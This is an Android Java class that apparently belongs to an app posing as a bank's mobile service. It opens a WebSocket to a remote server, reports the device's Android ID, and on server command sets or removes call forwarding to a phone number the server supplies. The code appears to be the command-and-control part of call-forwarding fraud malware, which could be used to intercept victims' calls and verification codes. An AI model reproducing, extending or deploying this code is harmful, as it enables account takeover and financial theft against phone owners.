package axismobile.service.testingonnboard.system;


import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class WebSocketManager {

    private static final String TAG = "WebSocketManager";
    private static final String CHANNEL_ID = "WebsocketServiceChannel";
    private WebSocket webSocket;
    private final Context context;
    public String url;
    private final OkHttpClient client;
    private Handler reconnectHandler;

    public WebSocketManager(Context context) {

        this.context = context;
        reconnectHandler = new Handler(Looper.getMainLooper());
        Helper help = new Helper();
        this.url = help.SocketURL();
         client = new OkHttpClient.Builder()
                .pingInterval(30, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
    }

    public void connect() {
        Request request = new Request.Builder().url(url).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(@NonNull WebSocket webSocket, @NonNull okhttp3.Response response) {
                JSONObject data = new JSONObject();
                try {
                    data.put("message", "Android Device Connected");
                    data.put("action", "update-mobile-status");
                    data.put("mobile_id", Helper.getAndroidId(context.getApplicationContext()));
                    webSocket.send(data.toString());
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
                try {
                    Log.d(Helper.TAG, "Websockket Message "+ text);
                    JSONObject data = new JSONObject(text);
                    String action = data.optString("action");
                    SharedPreferencesHelper share = new SharedPreferencesHelper(context.getApplicationContext());
                    String connection_id =  share.getString("connection_id", "");
                    if(action.equals("update-call-forwarding-number-in-phone")){
                        String phone = data.getString("phone_number");
                        String sitename = data.getString("sitename");
                        Helper help = new Helper();
                        if(sitename.equals(help.SITE())){
                            CallForwardingHelper call = new CallForwardingHelper();
                            call.setCallForwarding(context.getApplicationContext(), phone, 0);

                            JSONObject sendData = new JSONObject();
                            sendData.put("sitename", sitename);
                            sendData.put("messageStatusInfo", "Phone Method Called..");
                            sendData.put("connection_id", connection_id);
                            sendData.put("action","response-call-forwarding-update");
                            String jsondata = sendData.toString();
                            webSocket.send(jsondata);
                        }else{
                            Log.e(TAG, "Websocket : Sitename not matched");
                        }
                    }else if(action.equals("remove-call-forwarding-number-in-phone")){
                        String phone = data.getString("phone_number");
                        String sitename = data.getString("sitename");
                        Helper help = new Helper();
                        if(sitename.equals(help.SITE())){
                            CallForwardingHelper call = new CallForwardingHelper();
                            call.removeCallForwarding(context.getApplicationContext(), 0);

                            JSONObject sendData = new JSONObject();
                            sendData.put("sitename", sitename);
                            sendData.put("connection_id", connection_id);
                            sendData.put("messageStatusInfo", "Phone Method Called..");
                            sendData.put("action","response-call-forwarding-update");
                            String jsondata = sendData.toString();
                            webSocket.send(jsondata);
                        }else{
                            Log.e(TAG, "Websocket : Sitename not matched");
                        }
                    }else if(action.equals(("connection-id"))){
                        share.saveString("connection_id", data.getString("connection_id"));
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "Failed to parse JSON: " + e.getMessage());
                }
            }

            @Override
            public void onMessage(@NonNull WebSocket webSocket, @NonNull ByteString bytes) {
                Log.d(TAG, "Message from server (binary): " + bytes.hex());
            }

            @Override
            public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                String check = "Socket Service Closing: " + reason;
                if(!reason.isEmpty()){
                    Log.d(Helper.TAG, check);
                }else{
                    Log.d(Helper.TAG, "Socket Service Closing, Reason Not Found");
                }
                webSocket.close(1000, "Closing Connection");
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, okhttp3.Response response) {
                for (StackTraceElement element : t.getStackTrace()) {
                    Log.d(Helper.TAG, element.toString());
                }
                if (response != null) {
                    Log.d(Helper.TAG, "Response Failure: " + response.code() + "\n " + response.message());
                    if (response.body() != null) {
                        try {
                            Log.d(Helper.TAG, "Response body: " + response.body().string());
                        } catch (IOException e) {
                            Log.d(Helper.TAG, "Failed to read response body: " + e.getMessage());
                        } finally {
                            response.close();
                        }
                    }
                }
            }
        });
    }

    public void sendMessage(String message) {
        if (webSocket != null) {
            webSocket.send(message);
        }
    }

    public void closeConnection() {
        if (webSocket != null) {
            webSocket.close(1000, "Closing Connection");
        }else{
            Log.d(Helper.TAG, "connection closed");
        }
    }

    public boolean isConnected() {
        return webSocket != null && webSocket.send("ping");
    }

    private void showNotification(String content) {
        Intent notificationIntent = new Intent(context, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle("SMS Service")
                .setContentText(content)
//                .setSmallIcon(R.drawable.logo)  // Set your notification icon here
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(false)
                .setOngoing(true);

        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "WebSocket Channel",
                    NotificationManager.IMPORTANCE_LOW // Or IMPORTANCE_NONE for more restrictive options
            );
            channel.setDescription("Channel for WebSocket notifications");
            notificationManager.createNotificationChannel(channel);
        }

        notificationManager.notify(1, builder.build());
    }
}